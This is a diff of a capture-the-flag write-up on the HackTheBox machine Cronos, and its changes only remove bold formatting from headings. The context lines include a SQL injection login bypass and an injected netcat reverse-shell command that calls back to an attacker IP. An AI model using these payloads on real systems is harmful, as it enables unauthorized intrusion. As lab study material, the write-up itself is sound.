@@ -41,7 +41,7 @@ ports=$(sudo nmap -p- -Pn --min-rate=1000 -T4 10.10.10.13 | grep ^[0-9] | cut -d
 
 ![Untitled](https://0xetern4lw0lf.github.io/assets/img/HTB/HTB-Cronos/Untitled.png)
 
-## Port **53** (DNS) ****
+## Port 53 (DNS) 
 
 For DNS enumeration, the first thing to do is try to resolve the Cronos IPs. I'll use `nslookup`, setting the server to Cronos and then looking up Cronos' IP:
 
@@ -65,7 +65,7 @@ We add the subdomain in `/etc/hosts`
 
 ![Untitled](https://0xetern4lw0lf.github.io/assets/img/HTB/HTB-Cronos/Untitled%203.png)
 
-### **Brute Force Subdomain**
+### Brute Force Subdomain
 
 I'll run a `gobuster` quick subdomain brute force, but it will only return the three known ones:
 
@@ -79,7 +79,7 @@ Found: ns1.cronos.htb
 Found: admin.cronos.htb
 ```
 
-## **Port 80 (HTTP)**
+## Port 80 (HTTP)
 
 Both `cronos.htb` and `www.cronos.htb` lead to this page:
 
@@ -91,7 +91,7 @@ Both `cronos.htb` and `www.cronos.htb` lead to this page:
 
 ![Untitled](https://0xetern4lw0lf.github.io/assets/img/HTB/HTB-Cronos/Untitled%205.png)
 
-### **SQL Injection**
+### SQL Injection
 
 We tried SQL Injection on the login page.
 
@@ -103,7 +103,7 @@ alternative: `admin'-- -`
 
 ---
 
-### **Remote Code Execution (RCE)**
+### Remote Code Execution (RCE)
 
 We managed to inject linux commands with “`;" + "command"`
 
@@ -115,7 +115,7 @@ We managed to inject linux commands with “`;" + "command"`
 
 # Exploration
 
-## **Exploring RCE**
+## Exploring RCE
 
 ```bash
 8.8.8.8;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.7 443 >/tmp/f
@@ -135,7 +135,7 @@ export SHELL=bash
 export TERM=xterm-256color
 ```
 
-### **Enumeration**
+### Enumeration
 
 The Linpeas output reveals a php file running as root as a scheduled task in crontab.
 
